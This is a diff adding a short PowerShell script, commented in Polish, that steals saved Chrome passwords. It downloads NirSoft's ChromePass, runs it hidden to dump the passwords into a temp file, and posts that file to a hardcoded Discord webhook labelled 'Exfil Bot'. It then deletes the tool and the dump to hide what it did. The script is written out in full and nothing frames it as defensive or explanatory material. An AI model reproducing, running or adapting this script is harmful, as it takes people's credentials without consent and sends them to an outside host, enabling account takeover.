@@ -1,0 +1,31 @@
+# === Ścieżki ===
+$LocalPath = "$env:TEMP\creds.txt"
+$WebhookUrl = https://discord.com/api/webhooks/1361318439314128928/0ysFUO-d6BMEU4T7fQmlHVCAU2lK8-3gr-HgTDMOwu3QZ1ikm1_k9t9LAPMLM1IBg--z
+
+# === Eksport Chrome'owych haseł (zależne od OS i wersji przeglądarki) ===
+# Używamy narzędzia ChromePass od NirSoft
+$ChromePassUrl = "https://www.nirsoft.net/toolsdownload/chromepass.zip"
+$ChromePassZip = "$env:TEMP\chromepass.zip"
+$ChromePassDir = "$env:TEMP\chromepass"
+
+# Tworzymy folder tymczasowy
+New-Item -ItemType Directory -Force -Path $ChromePassDir | Out-Null
+
+# Pobieramy i rozpakowujemy ChromePass
+Invoke-WebRequest $ChromePassUrl -OutFile $ChromePassZip
+Expand-Archive -LiteralPath $ChromePassZip -DestinationPath $ChromePassDir
+
+# Uruchamiamy ChromePass i eksportujemy hasła do pliku txt
+Start-Process -FilePath "$ChromePassDir\chromepass.exe" -ArgumentList "/stext $LocalPath" -WindowStyle Hidden -Wait
+
+# === Wysyłka na webhook ===
+$FileContent = Get-Content $LocalPath -Raw
+Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body @{
+    username = "Exfil Bot"
+    content = "```\n$FileContent\n```"
+}
+
+# === Sprzątanie ===
+Remove-Item $ChromePassZip -Force
+Remove-Item $ChromePassDir -Recurse -Force
+Remove-Item $LocalPath -Force
